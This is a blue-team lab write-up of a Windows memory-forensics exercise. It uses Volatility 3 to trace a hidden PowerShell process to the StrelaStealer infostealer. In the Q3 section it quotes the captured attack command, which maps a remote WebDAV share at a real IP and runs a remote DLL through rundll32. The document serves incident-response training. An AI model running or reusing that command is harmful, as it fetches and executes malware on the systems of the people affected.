# Reveal Walkthrough

## Overview

This CyberDefenders lab focuses on a 2 GB Windows memory dump captured after suspicious activity on an internal workstation. Volatility 3 reveals the malicious process, its parent, its command line, and its connection to the StrelaStealer malware family.

## Challenge Details

| Field | Details |
|---|---|
| Platform | CyberDefenders |
| Category | Memory Forensics and Incident Response |
| Status | Completed |
| Lab | [Reveal](https://cyberdefenders.org/blueteam-ctf-challenges/reveal/) |

## Tools Used

- Kali Linux
- Volatility 3
- VirusTotal

## Memory Image Profile

The `windows.info` output provides the basic profile of the memory image.

```bash
python vol.py -f <path_to_memory_dump> windows.info
```

The output identified the system as Windows 10, showed the NT root as `C:\Windows`, and gave a memory capture time of `2024-07-15 07:08:00`.

<img width="1286" height="502" alt="Volatility 3 environment setup in Kali Linux" src="https://github.com/user-attachments/assets/ec174655-860f-4b1d-93e9-7399073cfc70" />

<img width="966" height="40" alt="Windows memory image profile information" src="https://github.com/user-attachments/assets/ced3d744-5272-4d15-aa08-d3a4ab28f77b" />

## Questions and Findings

### Q1: What is the malicious process?

The `windows.malfind` plugin highlights memory regions that may contain injected or suspicious executable code. Its output points to a PowerShell process with PID `3692`, and the later command-line evidence shows that this process ran a hidden network command. Together, these details identify `powershell.exe` as the malicious process.

**Answer:** `powershell.exe`

```bash
python vol.py -f <path_to_memory_dump> windows.malfind
```

<img width="1294" height="359" alt="Suspicious PowerShell process found with malfind" src="https://github.com/user-attachments/assets/a6aefb3c-8e3d-4e90-b2cc-8bb89069fdb2" />

### Q2: What is the parent PID of the malicious process?

The `windows.pstree` plugin organizes processes by their parent-child relationships. In the output, the suspicious PowerShell process with PID `3692` is linked to PID `4210` as its parent. Even if the parent process had already ended, the relationship remained available in the captured memory.

**Answer:** `4210`

```bash
python vol.py -f <path_to_memory_dump> windows.pstree | grep "3692"
```

<img width="952" height="39" alt="Filtering the process tree for PID 3692" src="https://github.com/user-attachments/assets/6d251102-5071-41bd-a3a5-f94eabd8b063" />

<img width="1291" height="182" alt="Parent PID 4210 in the process tree" src="https://github.com/user-attachments/assets/b2610ef3-59a9-4c13-83fc-a81bf714acb1" />

### Q3: What filename was used for the second-stage payload?

The PowerShell command uses `rundll32` to load a DLL from a remote path. In the command, the final file component before the exported function name `entry` is `3435.dll`. This identifies the filename used for the second-stage payload.

**Answer:** `3435.dll`

```powershell
powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

<img width="1042" height="41" alt="Second-stage DLL file in the PowerShell command" src="https://github.com/user-attachments/assets/5a86380f-9f16-4126-9e80-95377128ca7f" />

### Q4: What shared directory was accessed on the remote server?

The remote location follows a UNC-style WebDAV path. After the server address and port, the path contains `davwwwroot` before the DLL filename. That section of the path is the shared directory accessed on the remote server.

**Answer:** `davwwwroot`

<img width="1290" height="42" alt="Remote davwwwroot share in the command line" src="https://github.com/user-attachments/assets/82d4def7-60fc-48d6-b4ce-c12df5ca633f" />

### Q5: What MITRE ATT&CK sub-technique matches this execution method?

The command does not launch the malicious DLL directly. Instead, it uses the trusted Windows utility `rundll32.exe` to load the remote DLL and call its `entry` function. MITRE ATT&CK classifies this abuse of Rundll32 under Signed Binary Proxy Execution, sub-technique `T1218.011`.

**Answer:** `T1218.011` - Signed Binary Proxy Execution: Rundll32

### Q6: Which username ran the malicious process?

The `windows.getsids.GetSIDs` plugin displays the security identifiers associated with a process. The results for PID `3692` map the process to the user account named `Elon`. They also show administrator membership and a high integrity level, meaning the malicious process was running with elevated access.

**Answer:** `Elon`

```bash
python vol.py -f <path_to_memory_dump> windows.getsids.GetSIDs | grep "3692"
```

<img width="1201" height="378" alt="Elon user SID and privileges for PID 3692" src="https://github.com/user-attachments/assets/9e86b10a-2948-473b-a434-eaae5c8a2295" />

### Q7: What is the malware family?

The PowerShell command provides the remote IP address `45.9.74.32`, which can be used as a threat intelligence pivot. VirusTotal relations connect this address to suspicious DLL files and reporting associated with an infostealer that targets email credentials. Those related indicators identify the malware family as StrelaStealer.

**Answer:** `StrelaStealer`

<img width="1871" height="951" alt="VirusTotal evidence connecting the IP to StrelaStealer" src="https://github.com/user-attachments/assets/63e8a823-c45f-43af-9564-9edd12405405" />

## Key Findings

- A hidden PowerShell process connected to `45.9.74.32` over port `8888`.
- The command loaded `3435.dll` from the `davwwwroot` WebDAV share with `rundll32.exe`.
- The malicious process ran under the `Elon` account with elevated access.
- Threat intelligence connected the activity to StrelaStealer.

## Lessons Learned

- Process trees and command-line data are important for rebuilding an attack from memory.
- Memory evidence and threat intelligence work well together when identifying a malware family.

Built and Documented by Aluseni Waritay
